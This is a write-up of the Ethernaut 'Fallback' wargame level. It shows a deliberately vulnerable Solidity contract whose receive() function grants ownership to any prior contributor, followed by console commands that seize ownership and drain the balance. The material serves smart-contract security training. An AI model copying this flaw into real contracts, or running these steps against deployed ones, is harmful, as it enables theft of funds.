---
title: "Fallback"
tags: ["Fallback Methods"]
reference: https://ethernaut.openzeppelin.com/level/1
---

# Description

Look carefully at the contract's code below.

You will beat this level if

you claim ownership of the contract
you reduce its balance to 0
  Things that might help

How to send ether when interacting with an ABI
How to send ether outside of the ABI
Converting to and from wei/ether units (see help() command)
Fallback methods

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

# Solution

1. learn how to become owner

- (1) contribute `< 0.001 ether`
- (2) call `receive()` function

```sol
    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }
    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
```

2. call `contribute()`

```
tx = {to: '0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB', value: '10', from: '0xB1473Ba227C4645501E0e05f4839b00ED8320d33', gas: 40000}
contract.contribute.sendTransaction(tx)
```

3. call `recieve()`

```
contract.sendTransaction(tx)
```

4. call `withdraw()`

```
contract.withdraw()
```

5. check balance

```
await getBalance(instance)
'0'
```
